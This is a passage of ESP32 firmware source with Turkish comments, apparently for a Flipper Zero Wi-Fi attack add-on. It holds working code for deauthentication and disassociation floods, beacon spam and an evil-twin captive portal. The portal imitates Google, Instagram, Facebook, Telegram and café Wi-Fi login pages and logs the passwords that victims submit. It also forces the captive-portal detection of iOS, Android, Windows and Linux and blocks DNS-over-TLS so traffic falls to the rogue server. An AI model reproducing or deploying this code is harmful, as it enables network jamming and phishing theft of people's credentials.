    esp_wifi_set_channel(ap->channel, WIFI_SECOND_CHAN_NONE);
    delayMicroseconds(200);

    // Temel Frame Taslağı (26 byte)
    uint8_t frame[26] = {
        0xC0, 0x00,                         // 0-1: Frame Control
        0x3A, 0x01,                         // 2-3: Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // 4-9: DA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 10-15: SA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 16-21: BSSID
        0x00, 0x00,                         // 22-23: Seq Control
        0x07, 0x00                          // 24-25: Reason code
    };

    // Yaygın reason kodları — farklı cihazlar farklı kodlara tepki verir
    static const uint8_t REASON_CODES[] = {
        0x01, // Unspecified
        0x04, // Disassociated due to inactivity
        0x05, // Disassociated (AP full)
        0x06, // Class 2 frame from non-authenticated STA
        0x07, // Class 3 frame from non-associated STA
        0x08, // Disassociated (STA leaving)
    };
    #define NUM_REASONS (sizeof(REASON_CODES) / sizeof(REASON_CODES[0]))

    int count = aggr_to_count();

    // Seçili client var mı kontrol et (Listed Deauth için)
    bool has_selected_client = false;
    if(!broadcast_ok) {
        for(int c = 0; c < ap->client_count; c++) {
            if(ap->clients[c].selected) {
                has_selected_client = true;
                break;
            }
        }
    }
    
    for(int i = 0; i < count; i++) {
        uint8_t reason = REASON_CODES[i % NUM_REASONS];
        
        // ── 1. BROADCAST DEAUTH: AP → Broadcast ──────────────
        // broadcast_ok=true → her zaman gönder (WiFi Jam, Complete Jam)
        // broadcast_ok=false → sadece seçili client yoksa gönder (Listed Deauth, AP seçili ama client yok)
        if(broadcast_ok || !has_selected_client) {
            frame[0] = 0xC0; // Deauth
            memset(frame + 4, 0xFF, 6);          // DA = Broadcast
            memcpy(frame + 10, ap->bssid, 6);    // SA = AP
            memcpy(frame + 16, ap->bssid, 6);    // BSSID = AP
            frame[24] = reason; frame[25] = 0x00;
            uint16_t seq = ((g_deauth_count & 0x0FFF) << 4);
            frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
            send_raw_frame(frame, sizeof(frame), false);
            g_deauth_count++;

            // ── 2. BROADCAST DISASSOC: AP → Broadcast ────────────
            frame[0] = 0xA0; // Disassoc
            seq = ((g_deauth_count & 0x0FFF) << 4);
            frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
            send_raw_frame(frame, sizeof(frame), false);
            g_deauth_count++;
        }

        // ── 3. UNICAST: Sadece seçili istemcilere (Veya Complete Jam'de herkese) ──
        for(int c = 0; c < ap->client_count; c++) {
            bool target_this = ap->clients[c].selected || (g_mode == MODE_COMPLETE_JAM);
            if(!target_this) continue;

            // Paket kaybına karşı aynı frame'leri 3 defa hızlıca spamla
            for(int burst = 0; burst < 3; burst++) {
                // -- Yön A: AP → Client (Deauth) --
            frame[0] = 0xC0;
            memcpy(frame + 4, ap->clients[c].mac, 6);  // DA = Client
            memcpy(frame + 10, ap->bssid, 6);           // SA = AP
            memcpy(frame + 16, ap->bssid, 6);           // BSSID = AP
            frame[24] = reason;
            uint16_t seq = ((g_deauth_count & 0x0FFF) << 4);
            frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
            send_raw_frame(frame, sizeof(frame), false);
            g_deauth_count++;

            // -- Yön B: AP → Client (Disassoc) --
            frame[0] = 0xA0;
            seq = ((g_deauth_count & 0x0FFF) << 4);
            frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
            send_raw_frame(frame, sizeof(frame), false);
            g_deauth_count++;

            // -- Yön C: Client → AP (Deauth) --
            frame[0] = 0xC0;
            memcpy(frame + 4, ap->bssid, 6);             // DA = AP
            memcpy(frame + 10, ap->clients[c].mac, 6);   // SA = Client
            memcpy(frame + 16, ap->bssid, 6);             // BSSID = AP
            frame[24] = 0x08; // Reason: STA leaving
            seq = ((g_deauth_count & 0x0FFF) << 4);
            frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
            send_raw_frame(frame, sizeof(frame), false);
            g_deauth_count++;

            // -- Yön D: Client → AP (Disassoc) --
            frame[0] = 0xA0;
            seq = ((g_deauth_count & 0x0FFF) << 4);
            frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
            send_raw_frame(frame, sizeof(frame), false);
            g_deauth_count++;
            
            } // burst sonu
        }

        delayMicroseconds(500); // Frame'ler arası kısa bekleme
    }
}

// ─── Beacon Frame Gönderme ───────────────────────────────────
//
// 802.11 Beacon Frame Yapısı:
//   [0-1]   Frame Control: 0x80 0x00
//   [2-3]   Duration: 0x00 0x00
//   [4-9]   DA: FF:FF:FF:FF:FF:FF (Broadcast)
//   [10-15] SA: Random MAC
//   [16-21] BSSID: SA ile aynı
//   [22-23] Sequence Control
//   [24-31] Timestamp: 8 byte (genellikle 0)
//   [32-33] Beacon Interval: 0x64 0x00 (100 TU = ~102.4ms)
//   [34-35] Capability Info: 0x21 0x04
//   [36+]   Tagged Parameters (SSID IE, Supported Rates IE vb.)
//
static void build_and_send_beacon(const char* ssid) {
    uint8_t frame[BEACON_FRAME_SIZE];
    memset(frame, 0, sizeof(frame));

    int ssid_len = strlen(ssid);
    if(ssid_len > 32) ssid_len = 32;

    // --- MAC Header (24 byte) ---
    frame[0] = 0x80; // Frame Control byte 0: SubType=Beacon, Type=Mgmt
    frame[1] = 0x00; // Frame Control byte 1: flags
    frame[2] = 0x00; // Duration
    frame[3] = 0x00;
    // DA: Broadcast
    memset(frame + 4, 0xFF, 6);
    // SA: Rastgele MAC (unicast için LSB=0)
    frame[10] = (uint8_t)(esp_random() & 0xFE); // LSB=0 → unicast
    frame[11] = (uint8_t)esp_random();
    frame[12] = (uint8_t)esp_random();
    frame[13] = (uint8_t)esp_random();
    frame[14] = (uint8_t)esp_random();
    frame[15] = (uint8_t)esp_random();
    // BSSID = SA
    memcpy(frame + 16, frame + 10, 6);
    // Sequence Control
    frame[22] = (uint8_t)((g_beacon_count & 0x0F) << 4);
    frame[23] = (uint8_t)((g_beacon_count >> 4) & 0xFF);

    // --- Fixed Parameters (12 byte) ---
    // Timestamp [24-31]: 0 bırak (promiscuous modda önemli değil)
    // Beacon Interval [32-33]: 100 TU
    frame[32] = 0x64;
    frame[33] = 0x00;
    // Capability Info [34-35]: ESS=1, Short Preamble=1
    frame[34] = 0x21;
    frame[35] = 0x04;

    // --- Tagged Parameters (36'dan itibaren) ---
    int pos = 36;

    // SSID IE (Tag 0)
    frame[pos++] = 0x00;                    // Tag Number: SSID
    frame[pos++] = (uint8_t)ssid_len;       // Tag Length
    memcpy(frame + pos, ssid, ssid_len);
    pos += ssid_len;

    // Supported Rates IE (Tag 1) - zorunlu
    frame[pos++] = 0x01; // Tag: Supported Rates
    frame[pos++] = 0x08; // Length: 8
    frame[pos++] = 0x82; // 1 Mbps (basic)
    frame[pos++] = 0x84; // 2 Mbps (basic)
    frame[pos++] = 0x8B; // 5.5 Mbps (basic)
    frame[pos++] = 0x96; // 11 Mbps (basic)
    frame[pos++] = 0x24; // 18 Mbps
    frame[pos++] = 0x30; // 24 Mbps
    frame[pos++] = 0x48; // 36 Mbps
    frame[pos++] = 0x6C; // 54 Mbps

    // DS Parameter Set IE (Tag 3) - kanal bilgisi
    frame[pos++] = 0x03; // Tag: DS Parameter Set
    frame[pos++] = 0x01; // Length: 1
    frame[pos++] = g_current_ch; // Current Channel

    send_raw_frame(frame, pos, true);
    g_beacon_count++;
}

// ─── SSID Üretici ────────────────────────────────────────────
// g_beacon_type değerleri:
//   0 = Random  (Network_XXXX)
//   1 = Custom  (custom_ssids.txt'den)
//   2 = Top20   (hardcoded popüler ağlar)
static void get_beacon_ssid(char* out_ssid, size_t max_len) {
    switch(g_beacon_type) {
    case 0: // Random
        snprintf(out_ssid, max_len, "Network_%04X", (unsigned)(esp_random() & 0xFFFF));
        break;
    case 1: // Custom SSID Listesi
        if(g_custom_ssid_count > 0) {
            snprintf(out_ssid, max_len, "%s", g_custom_ssids[g_beacon_idx % g_custom_ssid_count]);
            g_beacon_idx++;
        } else {
            snprintf(out_ssid, max_len, "Custom_%04X", (unsigned)(esp_random() & 0xFFFF));
        }
        break;
    case 2: // Top20
        snprintf(out_ssid, max_len, "%s", TOP20_SSIDS[g_beacon_idx % TOP20_COUNT]);
        g_beacon_idx++;
        break;
    default: // Random fallback
        snprintf(out_ssid, max_len, "Network_%04X", (unsigned)(esp_random() & 0xFFFF));
        break;
    }
}

// ─── Portal Sayfası Oluşturucu ────────────────────────────────
static String portal_build_page(const char* page_progmem) {
    String out = String(FPSTR(page_progmem));
    String css = String(FPSTR(PORTAL_CSS));
    out.replace("%CSS%", css);
    return out;
}

// ─── Portal İçeriğini Seç ────────────────────────────────────
static String portal_get_current_page(void) {
    if(g_mode == MODE_EVIL_TWIN) {
        return portal_build_page(PAGE_EVILTWIN);
    }
    // ── Social Media Login sayfaları ──────────────────────────────────────
    if(g_mode == MODE_G_LOGIN   || g_mode == MODE_TARGET_G_LOGIN)   return portal_build_page(PAGE_GLOGIN);
    if(g_mode == MODE_IG_LOGIN  || g_mode == MODE_TARGET_IG_LOGIN)  return portal_build_page(PAGE_IGLOGIN);
    if(g_mode == MODE_FB_LOGIN  || g_mode == MODE_TARGET_FB_LOGIN)  return portal_build_page(PAGE_FBLOGIN);
    if(g_mode == MODE_TGM_LOGIN || g_mode == MODE_TARGET_TGM_LOGIN) return portal_build_page(PAGE_TGMLOGIN);
    // ── Free WiFi / Branded portals ────────────────────────────────────
    if(g_mode == MODE_SB_LOGIN  || g_mode == MODE_TARGET_SB_LOGIN)  return portal_build_page(PAGE_STARBUCKS);
    if(g_mode == MODE_MC_LOGIN  || g_mode == MODE_TARGET_MC_LOGIN)  return portal_build_page(PAGE_MCDONALDS);
    if(g_mode == MODE_SCH_LOGIN || g_mode == MODE_TARGET_SCH_LOGIN) return portal_build_page(PAGE_SCHOOL);
    if(g_mode == MODE_PUB_LOGIN || g_mode == MODE_TARGET_PUB_LOGIN) return portal_build_page(PAGE_PUBLICWIFI);
    // ── Captive Portal Mesajları ───────────────────────────────────────
    switch(g_portal_type) {
    case 1:  return portal_build_page(PAGE_FREEWIFI);
    case 2:  return portal_build_page(PAGE_MAINT);
    case 3:  return portal_build_page(PAGE_AUTH);
    default: return portal_build_page(PAGE_UPDATE);
    }
}

// ─── WebServer Route Handler'ları ─────────────────────────────
// Tüm GET isteklerini portal sayfası ile yanıtla
// Bu fonksiyon start_captive_portal içinde WebServer'a bağlanır

static void handle_portal_root(void) {
    if(!g_web_server) return;
    String page = portal_get_current_page();
    g_web_server->send(200, "text/html", page);
    tx("LOG:Portal page served");
}

static void handle_portal_login(void) {
    if(!g_web_server) return;
    // POST verilerini yakala
    String body = "";
    if(g_web_server->hasArg("plain")) {
        body = g_web_server->arg("plain");
    } else {
        // Form encoded data — tüm argümanları topla
        for(int i = 0; i < g_web_server->args(); i++) {
            if(i > 0) body += "&";
            body += g_web_server->argName(i) + "=" + g_web_server->arg(i);
        }
    }
    g_portal_clients++;

    /* Mod'a göre credential log prefix */ 
    if(g_mode == MODE_EVIL_TWIN) {
        String pass = g_web_server->arg("pass");
        tx("LOG:EVILTWIN_PASS|%s", pass.c_str());
        tx("STATUS:EVIL_TWIN|Deauth:%lu Portal:%lu SSID:%s",
           (unsigned long)g_deauth_count, (unsigned long)g_portal_clients, g_portal_ssid);
    } else if(g_mode == MODE_G_LOGIN || g_mode == MODE_TARGET_G_LOGIN) {
        tx("LOG:GLOGIN_DATA|%s", body.c_str());
        tx("STATUS:G_LOGIN|Clients:%lu SSID:%s",
           (unsigned long)g_portal_clients, g_portal_ssid);
    } else if(g_mode == MODE_IG_LOGIN || g_mode == MODE_TARGET_IG_LOGIN) {
        tx("LOG:IGLOGIN_DATA|%s", body.c_str());
        tx("STATUS:IG_LOGIN|Clients:%lu SSID:%s",
           (unsigned long)g_portal_clients, g_portal_ssid);
    } else if(g_mode == MODE_FB_LOGIN || g_mode == MODE_TARGET_FB_LOGIN) {
        tx("LOG:FBLOGIN_DATA|%s", body.c_str());
        tx("STATUS:FB_LOGIN|Clients:%lu SSID:%s",
           (unsigned long)g_portal_clients, g_portal_ssid);
    } else if(g_mode == MODE_TGM_LOGIN || g_mode == MODE_TARGET_TGM_LOGIN) {
        tx("LOG:TGMLOGIN_DATA|%s", body.c_str());
        tx("STATUS:TGM_LOGIN|Clients:%lu SSID:%s",
           (unsigned long)g_portal_clients, g_portal_ssid);
    } else {
        /* Free WiFi portals (SB, MC, PUB, SCH) + diger modlar → passwords.txt */
        tx("LOG:PORTAL_DATA|%s", body.c_str());
        tx("STATUS:PORTAL|Captured:%lu", (unsigned long)g_portal_clients);
    }

    String page = portal_build_page(PAGE_SUCCESS);
    g_web_server->send(200, "text/html", page);
}

// ─── Captive Portal Detection Handlers ────────────────────────
// Her platform farklı URL'leri kontrol eder.
// Amacımız: OS'a "internet yok, captive portal var" mesajı vermek.

// iOS / macOS detection
// Beklenen: www.apple.com/library/test/success.html → 200 + "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"
// Biz "Success" döndürmeyip portal'a yönlendiriyoruz → iOS "Ağe Giriş Yap" popup'ı açar
static void handle_apple_hotspot(void) {
    if(!g_web_server) return;
    // iOS/macOS gelen isteğe doğrudan portal sayfasını ver — redirect yerine 200 ile döndür
    // Bu şekilde iOS captive browser içinde sayfamız açılır
    String page = portal_get_current_page();
    g_web_server->send(200, "text/html", page);
    tx("LOG:iOS captive check → portal served");
}

// Android: generate_204 → 204 bekler, 204 değilse captive portal var demek
// 302 redirect ÇALIŞMIYOR çünkü Android redirect destination'ı güvensiz sayıyor
// 200 OK + HTML içerik → Android "Captive portal var!" diye bildirim gösteriyor ✅
static void handle_generate_204(void) {
    if(!g_web_server) return;
    // 200 + portal HTML → Android captive portal notification tetiklenir
    String page = portal_get_current_page();
    g_web_server->send(200, "text/html", page);
    tx("LOG:Android captive check (200+HTML) → portal triggered");
}

// Windows NCSI: ncsi.txt → "Microsoft NCSI" beklenir, değilse captive portal var
// Önemli: İki send() olursa crash! Sadece bir send() gönder.
static void handle_windows_ncsi(void) {
    if(!g_web_server) return;
    g_web_server->sendHeader("Location", "http://192.168.4.1/", true);
    g_web_server->send(302, "text/plain", "");
    tx("LOG:Windows NCSI check → redirect");
}

// Windows Connect Test: connecttest.txt → "Microsoft Connect Test" beklenir
static void handle_windows_connect(void) {
    if(!g_web_server) return;
    g_web_server->sendHeader("Location", "http://192.168.4.1/", true);
    g_web_server->send(302, "text/plain", "");
    tx("LOG:Windows connecttest → redirect");
}

// Linux NetworkManager captive check
// Ubuntu: connectivity-check.ubuntu.com → "NetworkManager is online" bekler
// GNOME: nmcheck.gnome.org/check_network_status.txt → "NetworkManager is online." bekler
// Fedora: fedoraproject.org/static/hotspot.html → belirli içerik bekler
// Biz farklı içerik döndürünce NM "captive portal var" der ve tarayıcı açar
static void handle_linux_nm_check(void) {
    if(!g_web_server) return;
    // Portal HTML'i ver → NetworkManager "internet yok, captive portal" olarak işaretler
    String page = portal_get_current_page();
    g_web_server->send(200, "text/html", page);
    tx("LOG:Linux NM captive check → portal HTML served");
}

// Tüm bilinmeyen URL'ler → portal sayfası (catch-all)
static void handle_not_found(void) {
    if(!g_web_server) return;
    // Bilinen captive check hostname'leri — bunların hepsini portala yönlendir
    String host = g_web_server->hostHeader();
    if(host == "192.168.4.1" || host == g_portal_ip.toString()) {
        // Kendi IP'mize gelen istek → direkt portal HTML
        String page = portal_get_current_page();
        g_web_server->send(200, "text/html", page);
    } else {
        // Başka host (captive.apple.com, msftconnecttest.com, vb.) → redirect
        g_web_server->sendHeader("Location", "http://192.168.4.1/", true);
        g_web_server->send(302, "text/plain", "");
        tx("LOG:Captive redirect → %s", host.c_str());
    }
}

// ─── Layer-3 Captive Hook (DNS-over-TLS Blocker) ────────────────
// Ticari AP'lerin yaptığı gibi IP paket seviyesinde müdahale.
// SADECE port 853 (DoT) paketleri düşürülür — başka hiçbir şeye dokunulmaz.
// Bu sayede Android “Private DNS: Automatic” modu plain DNS’e fallback yapar,
// ESP32’nin wildcard DNS server’ı devreye girer ve captive portal tetiklenir.



typedef err_t (*netif_input_fn_t)(struct pbuf *p, struct netif *inp);
static netif_input_fn_t  g_orig_ap_input = nullptr;
static struct netif*     g_hooked_netif  = nullptr;

static err_t captive_packet_hook(struct pbuf *p, struct netif *inp) {
    // Minimum IPv4 header (20 byte) + transport header (4 byte) kontrol
    if(p && p->payload && p->len >= 24) {
        const uint8_t* raw  = (const uint8_t*)p->payload;
        uint8_t ip_ver      = raw[0] >> 4;
        if(ip_ver == 4) {
            uint8_t ip_hlen  = (raw[0] & 0x0F) << 2;
            uint8_t proto    = raw[9];
            if((proto == 6 || proto == 17) && p->len >= (uint16_t)(ip_hlen + 4)) {
                const uint8_t* tp  = raw + ip_hlen;
                uint16_t dst_port  = ((uint16_t)tp[2] << 8) | tp[3];

                // ── Engelle: DNS-over-TLS (TCP/UDP 853) ──────────────────
                // Neden: Android Private DNS → DoT → ESP32 DNS'ini atlıyor
                // Düzeltme: DoT bloke → plain DNS'e fallback → ESP32 yakalıyor
                if(dst_port == 853) {
                    pbuf_free(p);
                    return ERR_OK;
                }

                // ── Engelle: QUIC / HTTP3 (UDP 443) ──────────────────────
                // Neden: DNS wildcard google.com→192.168.4.1 döner,
                //        Chrome QUIC (UDP/443) ile bağlanmaya çalışır,
                //        ESP32'de UDP/443 dinleyici yok → QUIC PROTOCOL ERROR
                // Düzeltme: QUIC bloke → Chrome TCP/HTTPS'e fallback yapar
                if(proto == 17 && dst_port == 443) {
                    pbuf_free(p);
                    return ERR_OK;
                }
            }
        }
    }
    return g_orig_ap_input(p, inp); // Diğer tüm paketler normal akışına devam eder
}


static void install_captive_hook(void) {
    if(g_orig_ap_input) return; // Zaten kurulu

    // Arduino-ESP32'de esp_netif_get_netif_impl mevcut değil.
    // Bunun yerine lwIP'nin kendi NETIF_FOREACH ile AP arayüzcünü buluyoruz.
    // ESP32 AP netif'inin adı: name[0]='a', name[1]='p'
    struct netif* lwip_if = nullptr;
    NETIF_FOREACH(lwip_if) {
        if(lwip_if->name[0] == 'a' && lwip_if->name[1] == 'p') break;
    }
    if(!lwip_if || !lwip_if->input) { tx("LOG:Hook: AP lwIP netif not found"); return; }
    g_orig_ap_input = lwip_if->input;
    g_hooked_netif  = lwip_if;
    lwip_if->input  = captive_packet_hook;
    tx("LOG:Hook: DoT blocker active (port 853 blocked)");
}

static void remove_captive_hook(void) {
    if(!g_orig_ap_input || !g_hooked_netif) return;
    g_hooked_netif->input = g_orig_ap_input;
    g_orig_ap_input = nullptr;
    g_hooked_netif  = nullptr;
    tx("LOG:Hook: DoT blocker removed");
}

// ─── Portal Servislerini İşle (loop'tan çağrılır) ──────────────
static void portal_process(void) {
    if(!g_portal_active) return;
    if(g_dns_server) g_dns_server->processNextRequest();
    if(g_web_server) g_web_server->handleClient();
}

// ─── Captive Portal Başlat ────────────────────────────────────
static uint8_t g_portal_channel = 6; // Portal AP kanalı

static void start_captive_portal(const char* ssid, uint8_t page_type) {
    g_portal_type    = page_type;
    g_portal_clients = 0;
    strncpy(g_portal_ssid, ssid, PORTAL_SSID_MAX - 1);
    g_portal_ssid[PORTAL_SSID_MAX - 1] = '\0';

    // SoftAP oluştur (açık ağ — şifresiz)
    WiFi.mode(WIFI_AP_STA);
    delay(100);
    WiFi.softAPConfig(g_portal_ip, g_portal_ip, IPAddress(255,255,255,0));
    WiFi.softAP(g_portal_ssid, "", g_portal_channel, 0, 8);
    delay(800); // DHCP server'ın tam başlaması için bekle

    // ── DHCP Option 114: Captive Portal URI (RFC 8910) ────────────
    // Android 11+ / Samsung One UI: Bu DHCP option, DNS veya HTTPS'ye gerek kalmadan
    // cihaza "bu ağ bir captive portal, şu URL'ye git" mesajını verir.
    // Private DNS bypass için tasarlanmıştır — DNS-over-TLS kullanan cihazları da tetikler.
    // NOT: ESP-IDF API'si, DHCP server durdurulmuş haldeyken option set etmeyi gerektiriyor.
    {
        const char* portal_uri = "http://192.168.4.1/";
        esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if(ap_netif) {
            esp_netif_dhcps_stop(ap_netif);   // Option set için önce durdur
            esp_err_t ret = esp_netif_dhcps_option(
                ap_netif,
                ESP_NETIF_OP_SET,
                ESP_NETIF_CAPTIVEPORTAL_URI,
                (void*)portal_uri,
                strlen(portal_uri)
            );
            esp_netif_dhcps_start(ap_netif);  // Tekrar başlat
            if(ret == ESP_OK) {
                tx("LOG:DHCP Opt114 OK → %s", portal_uri);
            } else {
                tx("LOG:DHCP Opt114 FAIL → err=%d", ret);
            }
        } else {
            tx("LOG:WARN: DHCP Opt114 - AP netif not found");
        }
    }

    // ── DNSServer: Tüm DNS sorgularını ESP32 IP'ye yönlendir ──
    // Bu, tüm platform captive detection'larını otomatik tetikler
    if(g_dns_server) { delete g_dns_server; }
    g_dns_server = new DNSServer();
    g_dns_server->setErrorReplyCode(DNSReplyCode::NoError);
    g_dns_server->start(53, "*", g_portal_ip);

    // ── WebServer: Platform bazlı captive detection route'ları ──
    if(g_web_server) { g_web_server->stop(); delete g_web_server; }
    g_web_server = new WebServer(80);

    // Ana portal sayfası
    g_web_server->on("/", HTTP_GET, handle_portal_root);
    g_web_server->on("/portal", HTTP_GET, handle_portal_root);
    g_web_server->on("/login", HTTP_POST, handle_portal_login);

    // ── iOS / macOS captive detection ──
    g_web_server->on("/hotspot-detect.html",             HTTP_GET, handle_apple_hotspot);
    g_web_server->on("/library/test/success.html",       HTTP_GET, handle_apple_hotspot);
    g_web_server->on("/success.html",                    HTTP_GET, handle_apple_hotspot);
    g_web_server->on("/bag",                             HTTP_GET, handle_apple_hotspot); // macOS Ventura+

    // ── Android captive detection ──
    // AOSP + Google Play Services her ikisini de kontrol eder
    // NOT: 200+HTML dönmemiz gerekiyor, 302 değil — Android 302'yi takip etmiyor
    g_web_server->on("/generate_204",                    HTTP_GET, handle_generate_204);
    g_web_server->on("/gen_204",                         HTTP_GET, handle_generate_204);
    g_web_server->on("/connectivitycheck",               HTTP_GET, handle_generate_204);

    // ── Windows captive detection ──
    g_web_server->on("/connecttest.txt",                 HTTP_GET, handle_windows_connect);
    g_web_server->on("/ncsi.txt",                        HTTP_GET, handle_windows_ncsi);
    g_web_server->on("/redirect",                        HTTP_GET, handle_generate_204);

    // ── Linux / NetworkManager captive detection ──
    // Ubuntu 20.04+: connectivity-check.ubuntu.com → beklenen: "NetworkManager is online\n"
    // GNOME NM: nmcheck.gnome.org/check_network_status.txt → "NetworkManager is online.\n"
    // Fedora/RHEL: fedoraproject.org/static/hotspot.html
    // Biz farklı içerik dönünce NM "captive portal var" der, masaüstünde popup açar
    g_web_server->on("/check_is_connected",              HTTP_GET, handle_linux_nm_check);
    g_web_server->on("/check_network_status.txt",        HTTP_GET, handle_linux_nm_check);
    g_web_server->on("/connectivity-check.html",         HTTP_GET, handle_linux_nm_check);
    g_web_server->on("/static/hotspot.html",             HTTP_GET, handle_linux_nm_check);

    // Bilinmeyen tüm URL'ler → catch-all
    g_web_server->onNotFound(handle_not_found);

    g_web_server->begin();

    // NOT: SoftAP açıkken promiscuous mod açmıyoruz — TCP/IP stack'ini dondurur!
    esp_wifi_set_promiscuous(false);

    // Layer-3 hook: DNS-over-TLS (port 853) blokçasını kur
    install_captive_hook();

    g_portal_active = true;
    tx("STATUS:PORTAL|SSID:%s Page:%d CH:%d Active", g_portal_ssid, g_portal_type, g_portal_channel);
    tx("LOG:Portal started: SSID=%s CH=%d Page=%d (DNSServer+WebServer)", g_portal_ssid, g_portal_channel, g_portal_type);
}

// ─── Captive Portal Durdur ────────────────────────────────────
static void stop_captive_portal(void) {
    if(!g_portal_active) return;

    // Layer-3 hook'u önce kaldır (sonra web/dns server'ı durdur)
    remove_captive_hook();

    if(g_web_server) {
        g_web_server->stop();
        delete g_web_server;
        g_web_server = NULL;
    }
    if(g_dns_server) {
        g_dns_server->stop();
        delete g_dns_server;
        g_dns_server = NULL;
    }
    WiFi.softAPdisconnect(true);

    // STA moduna geri dön (raw TX için)
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    g_portal_active = false;
    tx("LOG:Portal stopped. Captured %lu entries", (unsigned long)g_portal_clients);
}

// ─── PCAP Paketini Flipper'a Gönder ───────────────────────────
static void send_pcap_frame(uint8_t* payload, uint32_t length, wifi_pkt_rx_ctrl_t rx_ctrl) {
    PCAPRecordHeader h;
    uint32_t now_us = micros();
    h.ts_sec   = now_us / 1000000;
    h.ts_usec  = now_us % 1000000;
    
    // UART darboğazını önlemek için frame'ı sınırla (128 byte)
    uint32_t capture_len = (length > 128) ? 128 : length;
    h.incl_len = capture_len;
    h.orig_len = length;

    // Header + Payload'u hex olarak gönder
    // Hem Serial (USB-Debug) hem Serial1 (Flipper) portuna basıyoruz
    Serial.print("PCAP:");
    Serial1.print("PCAP:");
    
    // Header hex
    uint8_t* h_ptr = (uint8_t*)&h;
    for(size_t i = 0; i < 16; i++) {
        Serial.printf("%02X", h_ptr[i]);
        Serial1.printf("%02X", h_ptr[i]);
    }
    
    // Payload hex
    for(size_t i = 0; i < capture_len; i++) {
        Serial.printf("%02X", payload[i]);
        Serial1.printf("%02X", payload[i]);
    }
    Serial.println();
    Serial1.println();
}

// ─── Sniff MAC bazlı filtre yardımcısı ──────────────────────
static bool mac_matches_target(const uint8_t* mac) {
    return memcmp(mac, g_target_mac, 6) == 0;
}

// ─── Wi-Fi Promiscuous Callback ───────────────────────────────
// SNIFF RATE-LIMITER: en fazla her 200ms'de bir PCAP frame gönderilir.
// Bu sayede UART tamponçu dolmaz, Flipper'da RAM taşmaz.
#define SNIFF_PCAP_INTERVAL_MS  200
#define SNIFF_MAX_FRAME_BYTES   128   // Truncate ötesini gönderme

static void promiscuous_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    bool is_sniff_mode = (g_mode == MODE_SNIFF || g_mode == MODE_TARGET_SNIFF);
    if(g_mode != MODE_SCAN && g_mode != MODE_COMPLETE_JAM && !is_sniff_mode) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint32_t len = pkt->rx_ctrl.sig_len;

    // Uzunluk kontrolü (En azından MAC Header kadar olmalı, 24 bytes)
    if(len < 24) return;

    // ── Sniff modu: tüm paketleri PCAP olarak logla ──────────
    if(g_mode == MODE_SNIFF) {
        g_sniff_pkt_count++;
        // Rate-limit: en fazla her SNIFF_PCAP_INTERVAL_MS'de bir gönder
        uint32_t now_ms = millis();
        if(now_ms - g_sniff_last_pcap_ms >= SNIFF_PCAP_INTERVAL_MS) {
            uint16_t send_len = (len > SNIFF_MAX_FRAME_BYTES) ? SNIFF_MAX_FRAME_BYTES : len;
            send_pcap_frame(payload, send_len, pkt->rx_ctrl);
            g_sniff_sent_count++;
            g_sniff_last_pcap_ms = now_ms;
        }
        return;
    }

    // ── Target Sniff modu: sadece hedef MAC filtrelenmiş paketler ──
    if(g_mode == MODE_TARGET_SNIFF && g_target_mac_active) {
        uint8_t* addr1 = payload + 4;
        uint8_t* addr2 = payload + 10;
        if(mac_matches_target(addr1) || mac_matches_target(addr2)) {
            g_sniff_pkt_count++;
            uint32_t now_ms = millis();
            if(now_ms - g_sniff_last_pcap_ms >= SNIFF_PCAP_INTERVAL_MS) {
                uint16_t send_len = (len > SNIFF_MAX_FRAME_BYTES) ? SNIFF_MAX_FRAME_BYTES : len;
                send_pcap_frame(payload, send_len, pkt->rx_ctrl);
                g_sniff_sent_count++;
                g_sniff_last_pcap_ms = now_ms;
                // Kısa log
                char mac_str[18];
                uint8_t* src = mac_matches_target(addr2) ? addr2 : addr1;
                snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                    src[0],src[1],src[2],src[3],src[4],src[5]);
                tx("LOG:PKT|MAC:%s|Pkts:%lu", mac_str, (unsigned long)g_sniff_pkt_count);
            }
        }
        return;
    }

    // Eğer detaylı tarama (PCAP) modu aktifse management frame'lerini gönder
    if(g_scan_type == 1 && type == WIFI_PKT_MGMT) {
        send_pcap_frame(payload, len, pkt->rx_ctrl);
    }

    // -- Client (İstemci) Tespiti --
    // DATA frame'leri → gerçek (globally unique) MAC adresleri
    // MGMT frame'leri → random MAC olabilir (Probe Request vb.)
    if(type == WIFI_PKT_DATA) {
        // Data frame'lerde MAC'ler gerçektir — güvenle ekle
        uint8_t* addr1 = payload + 4;
        uint8_t* addr2 = payload + 10;
        uint8_t* addr3 = payload + 16;
        
        for(int i = 0; i < g_ap_count; i++) {
            if(memcmp(g_aps[i].bssid, addr1, 6) == 0) {
                add_client_to_ap(&g_aps[i], addr2, false);
                break;
            } else if(memcmp(g_aps[i].bssid, addr2, 6) == 0) {
                add_client_to_ap(&g_aps[i], addr1, false);
                break;
            } else if(memcmp(g_aps[i].bssid, addr3, 6) == 0) {
                add_client_to_ap(&g_aps[i], addr1, false);
                add_client_to_ap(&g_aps[i], addr2, false);
                break;
            }
        }
    } else if(type == WIFI_PKT_MGMT) {
        // Mgmt frame'lerde (Probe Req vb.) random MAC olabilir
        // only_global=true → sadece globally-unique MAC'leri ekle
        uint8_t* addr1 = payload + 4;
        uint8_t* addr2 = payload + 10;
        uint8_t* addr3 = payload + 16;
        
        for(int i = 0; i < g_ap_count; i++) {
            if(memcmp(g_aps[i].bssid, addr1, 6) == 0) {
                add_client_to_ap(&g_aps[i], addr2, true);
                break;
            } else if(memcmp(g_aps[i].bssid, addr2, 6) == 0) {
                add_client_to_ap(&g_aps[i], addr1, true);
                break;
